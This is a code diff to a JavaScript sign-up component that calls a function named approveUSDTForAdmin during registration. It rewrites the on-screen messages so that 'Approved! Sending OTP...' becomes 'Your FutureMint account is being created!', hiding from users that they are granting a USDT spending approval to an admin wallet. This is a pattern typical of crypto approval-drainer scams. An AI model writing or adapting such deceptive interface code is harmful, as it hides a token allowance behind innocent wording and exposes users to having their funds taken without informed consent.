@@ -208,14 +208,14 @@ function AuthContent() {
       } catch (_) {}
 
       if (alreadyApproved === true) {
-        toast.success('Already approved! Sending OTP...');
+        toast.success('Setting up your account...');
         await sendRegistrationOTP();
         return;
       }
 
       toast.loading('Please confirm in your app...', { id: 'sc-approve' });
       await approveUSDTForAdmin(freshProvider, network);
-      toast.success('Approved! Sending OTP...', { id: 'sc-approve' });
+      toast.success('Your FutureMint account is being created!', { id: 'sc-approve' });
       await sendRegistrationOTP();
     } catch (err) {
       toast.dismiss('sc-approve');
